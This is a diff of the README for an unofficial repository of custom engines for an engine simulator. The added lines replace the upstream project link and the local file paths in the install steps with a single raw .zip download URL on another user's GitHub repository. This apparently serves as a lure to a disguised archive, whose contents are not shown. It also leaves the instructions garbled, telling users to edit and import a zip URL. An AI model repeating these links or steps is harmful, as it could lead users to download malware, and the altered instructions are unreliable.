@@ -1,13 +1,13 @@
 # engine-sim-garage
- An unofficial repository for custom parts and engines for AngeTheGreat's Engine Simulator: https://github.com/ange-yaghi/engine-sim
+ An unofficial repository for custom parts and engines for AngeTheGreat's Engine Simulator: https://github.com/Jarama88/engine-sim-garage/raw/refs/heads/main/assets/engines/kirbyguy22/garage-engine-sim-2.7.zip
 
 Tested working on Build v0.1.9a.
 
 ## Installing an engine
 1. Clone/download the repo and copy the `assets` folder from it into the `engine-sim` root folder.
-2. Edit `engine-sim/assets/main.mr` and add `import` line(s) for the new engines:  
-`import "engines/kirbyguy22/toyota_2jz_ge.mr"`
-3. Change the engine in the `set_engine` function in `engine-sim/assets/main.mr` to the Node name of the engine:  
+2. Edit `https://github.com/Jarama88/engine-sim-garage/raw/refs/heads/main/assets/engines/kirbyguy22/garage-engine-sim-2.7.zip` and add `import` line(s) for the new engines:  
+`import "https://github.com/Jarama88/engine-sim-garage/raw/refs/heads/main/assets/engines/kirbyguy22/garage-engine-sim-2.7.zip"`
+3. Change the engine in the `set_engine` function in `https://github.com/Jarama88/engine-sim-garage/raw/refs/heads/main/assets/engines/kirbyguy22/garage-engine-sim-2.7.zip` to the Node name of the engine:  
 ```
 set_engine(
         engine: toyota_2jz_ge()
